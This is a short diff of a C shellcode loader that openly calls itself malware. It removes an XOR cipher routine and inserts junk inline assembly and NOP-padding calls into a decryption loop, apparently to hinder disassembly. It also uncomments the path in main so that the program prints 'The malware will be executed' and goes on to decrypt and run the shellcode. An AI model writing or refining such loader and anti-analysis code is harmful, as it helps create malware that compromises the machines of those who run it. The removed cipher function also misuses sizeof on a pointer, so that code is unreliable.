@@ -297,22 +297,6 @@ int run_shellcode(){
     return 0;    
 }
 
-void xor_cipher(char* shellcode){
-    int i;
-    for (i=0; i<sizeof(shellcode); i++){
-        __asm(
-            "PUSH %EAX;"
-            "XOR %EAX, %EAX;"
-            "JZ True1;"
-        
-        "True1:"
-            "POP %EAX;"
-        );
-        spam_nops();
-        shellcode[i] ^= key[i % sizeof(key)];
-    }
-    return;
-}
 
 
 int decrypt_function(int characterSet[][CHARACTER_SET_SIZE], unsigned char *key, unsigned char *ciphertext){
@@ -365,6 +349,15 @@ int decrypt()
         // initial offset to the start of the row.
         for (int i2 = i; i2 < CHARACTER_SET_SIZE; i2++)
         {
+            __asm(
+                "PUSH %EAX;"
+                "XOR %EAX, %EAX;"
+                "JZ True1;"
+            
+            "True1:"
+                "POP %EAX;"
+            );
+            spam_nops();
             characterSet[i][i2 - i] = i2 + FIRST_BYTE;
         }
 
@@ -489,10 +482,8 @@ int main(){
         return 0;
     } else {
         printf("The malware will be executed");
-        // return 0;
     }
 
-    // return 0;
 
     decrypt(); // Decrypts the shellcode
 
